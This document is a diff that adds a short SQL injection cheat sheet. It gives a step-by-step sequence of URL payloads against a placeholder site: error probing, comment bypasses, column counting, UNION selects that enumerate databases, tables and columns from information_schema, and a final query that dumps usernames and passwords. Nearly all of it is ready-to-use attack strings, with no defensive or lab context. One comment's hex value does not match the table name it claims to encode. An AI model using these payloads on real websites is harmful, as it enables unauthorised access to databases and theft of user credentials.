@@ -1,0 +1,45 @@
+# To find a vulnerability website [']
+www.domain.com/something.php?id=1'
+
+# To Bypass/Comment Error
+# --    :   MySQL Linux Style
+# --+   :   MySQL Windows Style
+# #     :   Hash (URL encode while use)
+# --+-  :   SQL Comment
+# ;%00  :   Null Byte
+# `     :   Backtick
+
+# Remember when using [--] don't need to use [']
+www.domain.com/something.php?id=1--
+www.domain.com/something.php?id=1'--+
+www.domain.com/something.php?id=1'-- -
+
+# To find column in vuln website
+www.domain.com/something.php?id=1' ORDER BY 5-- <---No error
+www.domain.com/something.php?id=1' ORDER BY 6-- <---ERROR!
+
+# To find vuln column in website
+www.domain.com/something.php?id=1' UNION SELECT 1,2,3,4,5--
+
+# To show hidden number from vuln website [-]
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,3,4,5--
+
+# To show version and database
+# @@version, version(), database(), unhex(hex(@@version))
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,version(),4,5--
+
+# To obtain all databases in information_schema
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,group_concat(schema_name),4,5 FROM information_schema.schemata--
+
+# To show tables in current database
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()--
+
+# To show columns in current table
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,group_concat(column_name,0x3a),4,5 FROM information_schema.columns WHERE table_name="tbl_user"--
+
+# To bypass some error when retrieved data from table
+# Convert "tbl_user" no quotes to hex "74626C6D696E6973747279" and put 0x before number
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name=0x74626C6D696E6973747279--
+
+# To dump data from database
+www.domain.com/something.php?id=-1' UNION SELECT 1,2,group_concat(username,0x3a,password),4,5 FROM db_something--
